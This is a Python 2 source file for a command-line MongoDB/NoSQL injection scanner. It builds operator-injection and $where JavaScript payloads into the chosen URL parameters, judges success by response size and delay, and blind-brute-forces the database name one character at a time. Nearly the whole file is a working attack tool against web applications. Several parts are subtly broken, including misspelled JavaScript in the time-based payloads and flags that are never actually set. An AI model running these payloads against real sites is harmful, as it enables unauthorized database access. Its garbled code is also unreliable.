# -*- coding: utf-8 -*-
# __author__: sixwhale
from pymongo import MongoClient
import requests
import sys
import getopt
import time
import string
import random
from globalvalue import GlobalValue
from colorama import Fore, Back, Style, init
init(autoreset=True)


no_tag = GlobalValue.no_tag
yes_tag = GlobalValue.yes_tag
headers = GlobalValue.headers

def InjectOption(url):
	print url
	httpMethod = raw_input(Fore.CYAN + '[*] Set HTTP method (GET/POST): ')
	if httpMethod.lower() == 'get':
		getWeb(url,headers)
	elif httpMethod.lower() == 'post':
		print '[*] postWeb function is testing...'
	else:
		print(Fore.RED +'[Error] httpmethod is unvalid......')
		return 

def getWeb(url,headers):
	print '[*] Start web app attacks (GET)'
	
	global testNum
	testNum = 1

	global httpMethod
	httpMethod = 'GET'

	global possAddrs
	possAddrs = []

	global validAddrs
	validAddrs = []

	global lt24
	lt24 = False

	global str24
	str24 = False

	global int24
	int24 = False

	appUp = False
	strAttack = False
	intAttack = False

	print '[*] Checking url if correct......'
	if '?' not in url or '=' not in url:
		print(Fore.RED + '[Error] No URL  parameters provided for GET request...Check your url.\n')
		return
	print '[*] Checking status if site at \'%s\' is up......' % url
	try:
		req = requests.get(url,headers=headers)
		resCode = req.status_code
		#print type(resCode )
		if resCode == 200:	
			startTime = time.time()
			content = req.content
			endTime = time.time()
			resLength = int(len(content))

			reqTime = int(round((endTime-startTime), 3))

			print '[*] App is up, got response length of %s, and response time of %s seconds, starting inject test.' % (resLength, reqTime)
			appUp = True

		else:
			print(Fore.RED + '[Error] Got %s code from app, check your options.' % resCode)
	except Exception, e:
		print(Fore.RED + '[Error] %s, looks like the server didn\'t respond, check your options.' % e)
	if appUp == True:
		injectSize = raw_input(Fore.CYAN + '[*] Input test random string size: ')
		injectstr = getInjectStr(int(injectSize))

		basedInjectUrl = buildUrl(url, injectstr)
		print '[*] Based inject url is %s' % basedInjectUrl
		req = requests.get(basedInjectUrl,headers=headers)

		basedInjectLength = int(len(req.content))
		print '[*] Got response length of %s' % basedInjectLength
		deltaLenth = abs(resLength-basedInjectLength)

		if deltaLenth == 0:
			print '[*] No change in response size injecting a random parameter..\n'
		else:
			print '[*] Random value variance: %s' % deltaLenth

		#Test 1
		print(Fore.YELLOW + '[*] Testing Mongo PHP not equals associative array injection...')
		print '[*] Injecting %s' % urlArray[1]
		req = requests.get(urlArray[1], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1

		#Test 2
		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
		print '[*] Injecting %s' % urlArray[2]
		req = requests.get(urlArray[2], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 3
		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
		print '[*] Injecting %s' % urlArray[3]
		req = requests.get(urlArray[3], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 4
		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
		print '[*] Injecting %s' % urlArray[4]
		req = requests.get(urlArray[4], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 5
		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where Javascript integer escape attack for one record...')
		print '[*] Injecting %s' % urlArray[5]
		req = requests.get(urlArray[5], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 6
		print(Fore.YELLOW + '[*] Testing Mongo this not equals string escape attack for all records...')
		print '[*] Injecting %s' % urlArray[6]
		req = requests.get(urlArray[6], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 7
		print(Fore.YELLOW + '[*] Testing Mongo this not equals integer escape attack for all records...')
		print '[*] Injecting %s' % urlArray[7]
		req = requests.get(urlArray[7], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 8
		print(Fore.YELLOW + '[*] Testing  PHP/ExpressJS > undefined attack for all records...')
		print '[*] Injecting %s' % urlArray[8]
		req = requests.get(urlArray[8], headers=headers)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1

		doTimeAttack = raw_input(Fore.CYAN + '[*] Starting based time attack? (y/n)')

		if doTimeAttack in yes_tag:
			#整型
			print '[*] Starting Javascript integer escape time based injection...'	
			startTime = time.time()
			req = requests.get(urlArray[9], headers=headers)
			page = req.content
			endTime = time.time()
			timeDelta = int(round(endTime - startTime,3)) - reqTime

			if timeDelta > 25:
				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
				strAttack = True
			else:
				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
				strAttack = False

			#字符串
			print '[*] Starting Javascript string escape time based injection...'
			startTime = time.time()
			req = requests.get(urlArray[10], headers=headers)
			page = req.content
			endTime = time.time()
			timeDelta = int(round(endTime - startTime,3)) - reqTime

			if timeDelta > 25:
				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
				strAttack = True
			else:
				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
				strAttack = False

			if lt24 == True:
				print '[*] MongoDB < 2.4.0 detected. Starting brute forcing database info.'
				getDBInfo()

		print '[+] Valid URLs:'
		for url in validAddrs:
			print(Fore.GREEN  +'    %s' % url)
			
		print '\n '
		print '[+] Possible URLs:'
		for url in possAddrs:
			print(Fore.GREEN  +'    %s' % url)

def errorTest(errorcheck, testNum):
	global possAddrs #可能有效
	global httpMethod 

	if errorcheck.find('ReferenceError') != -1 or errorcheck.find('SyntaxError') != -1 or errorcheck.find('ILLEGAL') != -1:
		print '[*] Injection returned a MongoDB Error. Injection may be possible.'
		if httpMethod == 'GET':
			possAddrs.append(urlArray[testNum])
			return True
		else:
			pass
	else:
		return False


def checkResult(baseSize,injectSize,testNum,postData):
	global validAddrs #有效
	global possAddrs
	global httpMethod

	delta = abs(baseSize-injectSize)
	if (delta >= 100) and (injectSize != 0):
		print(Fore.GREEN + '[*] Response varied %s bytes from random parameter value! Injection works!' % delta)
		if httpMethod == 'GET':
			validAddrs.append(urlArray[testNum])
		else:
			pass
		if testNum == 2 or testNum == 4:
			lt24 = True
			str24 = True
		elif testNum == 3 or testNum == 5:
			lt24 = True
			int24 = True
		return

	elif (delta < 100) and (delta > 0) and (injectSize != 0):
		print '[*] Response variance was only %s bytes. Injection returned a MongoDB Error. Injection may be possible.' % delta
		if httpMethod == 'GET':
			possAddrs.append(urlArray[testNum])
		else:
			pass
		return

	elif delta == 0:
		print '[*] Injection did not work.'
		return

	else:
		print '[*] Injected response was smaller than random response. Injection may be possible.'
		if httpMethod == 'GET':
			possAddrs.append(urlArray[testNum])
		else:
			pass
		return 

def getInjectStr(size):
	print '''[*] What format should the random string take?
    [1] mixed (letters, numbers)
    [2] letters only'
    [3] number only'''

	format = True
	while format:
		format = raw_input(Fore.CYAN + '[*] choose: ')
		if format == '1':
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size))
		elif format == '2':
			chars = string.ascii_letters
			return ''.join(random.choice(chars) for x in range(size))
		elif format == '3':
			chars = string.digits
			return ''.join(random.choice(chars) for x in range(size))
        else:
        	format = True
        	print(Fore.RED + '[Error] Invalid section.')


def buildUrl(url, value):
	global urlArray
	urlArray = ['','','','','','','','','','','','']

	paramNames = []
	paramValues = []

	injectParams = []

	try:
		split_url = url.split('?')
		params = split_url[1].split('&')
	except:
		print(Fore.RED + '[Error] Not able to parse the URL and parameters. Check the url')
		return

	for item in params:
		index = item.find('=')
		paramNames.append(item[0:index])
		paramValues.append(item[index + 1:len(item)])

	print '[+] List of parameters:'
	index = 1
	for name in paramNames:
		print '    [%s] %s' % (index,name)
		index += 1

	try:
		injectIndex = raw_input(Fore.CYAN + '[*] Choose parmeters to inject (such as 1,2,3):')
		print injectIndex.split(',')
		for i in injectIndex.split(','):
			injectParams.append(paramNames[int(i)-1])
	except Exception, e:
		print(Fore.RED + '[Error] %s. Somthing wrong... Check inject parmeters.' % e)
		return 

	x = 0
	for i in range(12):
		urlArray[i] = split_url[0] + '?'

	for item in params:
		if paramNames[x] in injectParams:
			urlArray[0] += paramNames[x] + "=" + value + "&"
			urlArray[1] += paramNames[x] + "[$ne]=" + value + "&"			
			urlArray[2] += paramNames[x] + "=a'; return db.a.find(); var v='!" + "&"
			urlArray[3] += paramNames[x] + "=1; return db.a.find(); var v=1" + "&"
			urlArray[4] += paramNames[x] + "=a'; return db.a.findOne(); var v='!" + "&"
			urlArray[5] += paramNames[x] + "=1; return db.a.findOne(); var v=1" + "&"
			urlArray[6] += paramNames[x] + "=a'; return this.a !='" + value + "'; var v='!" + "&"
			urlArray[7] += paramNames[x] + "=1; return this.a !=" + value + "; var v=1" + "&"
			urlArray[8] += paramNames[x] + "[$gt]=&"
			#based time
			urlArray[9] += paramNames[x] + "=1; var date=new Date(); var cur=null; do{cur=new Date();} while((Math.adb(date.getTime()-cur.getTime()))/1000<10); reutn; var v=1" + "&"
			urlArray[10] += paramNames[x] + "=a'; var date=new Date(); var cur=null; do{cur=new Date();} while((Math.adb(date.getTime()-cur.getTime()))/1000<10); reutn; var v='!" + "&"
			urlArray[11] += paramNames [x] + "=a'; ---"
		else:
			for i in range(12):
				urlArray[i] += paramNames[x] + "=" + paramValues[x] + "&"
		x += 1

	#把URL中多余的&去掉
	x = 0
	while x < 12:
		urlArray[x] = urlArray[x][:-1]
		x += 1

	return urlArray[0]

def getDBInfo():
	getDBnameLen = False
	getDBname = False
	DBnameLen = 0
	nameCount = 0
	charCount = 0
	dbName = ''

	chars = string.ascii_letters + string.digits
	trueUrl = urlArray[11].replace("---","return true; var v ='!" + "&")
	req = requests.get(urlArray[11], headers=headers)
	baseLen = int(len(req.content))

	print '[*] Calculating the length of the database name.'

	while getDBnameLen == False:
		calcUrl = urlArray[11].replace("---","if(db.getName().length==%s) {return true;} var v='a&" % DBnameLen)
		req = requests.get(calcUrl)
		UrlLen = int(len(req.content))

		if UrlLen == baseLen:
			print '[*] Got database name length of %s characters.' % DBnameLen
			getDBnameLen = True
		else:
			DBnameLen += 1

	print '[+] Database name is: ',
	while getDBname == False:
		calcUrl = urlArray[11].replace("---","if(db.getName()[%s]==chars[%s]){return true;} var v='a&" % (nameCount,charCount))
		req = requests.get(calcUrl)
		UrlLen = int(len(req.content))

		if UrlLen == baseLen:
			dbName += chars[charCount]
			print  dbName,
			nameCount += 1
			charCount = 0

			if nameCount == DBnameLen:
				getDBname = True
		else:
			charCount += 1

